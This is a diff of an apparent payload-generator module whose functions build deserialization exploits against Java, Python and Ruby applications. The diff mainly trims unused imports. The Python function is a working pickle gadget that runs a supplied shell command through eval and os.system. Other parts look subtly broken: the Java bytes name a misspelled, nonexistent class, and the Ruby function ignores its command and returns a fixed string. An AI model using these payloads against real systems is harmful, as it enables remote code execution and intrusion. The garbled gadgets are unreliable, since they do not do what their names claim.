@@ -105,8 +105,6 @@ def build_java_jndi_ldap(callback_url: str) -> bytes:
 
 
 def build_java_commonscollections(cmd: str) -> bytes:
-    import hashlib
-    import os
     payload = b"\xac\xed\x00\x05"
     payload += b"\x73\x72\x00\x31\x6a\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x42\x61\x64\x53\x65\x72\x69\x61\x6c\x69\x7a\x61\x62\x6c\x65\x49\x6e\x76\x6f\x6b\x65\x72\x00\x00\x00\x00\x00\x00\x00\x02\x02\x00\x00"
     payload += b"\x78\x70"
@@ -153,7 +151,6 @@ def build_python_rce_subprocess(cmd: str = "id") -> bytes:
 
 def build_python_rce_eval(cmd: str = "id") -> bytes:
     import pickle
-    import base64 as b64mod
     class RCE:
         def __reduce__(self):
             return (eval, (f'__import__("os").system("{cmd}")',))
@@ -161,8 +158,7 @@ def build_python_rce_eval(cmd: str = "id") -> bytes:
 
 
 def build_ruby_rce(cmd: str = "id") -> str:
-    import base64
-    payload = 'Gem::Installer.new.i({})'.format(cmd)
+    'Gem::Installer.new.i({})'.format(cmd)
     return "BAhJBUxvYWRlckBvYmplY3Q6FkdhbTo6R2VtOjpJbnN0YWxsZXJ7AjpAc3RhdHVzczs6B2V4aXQ7Cg=="
 
 
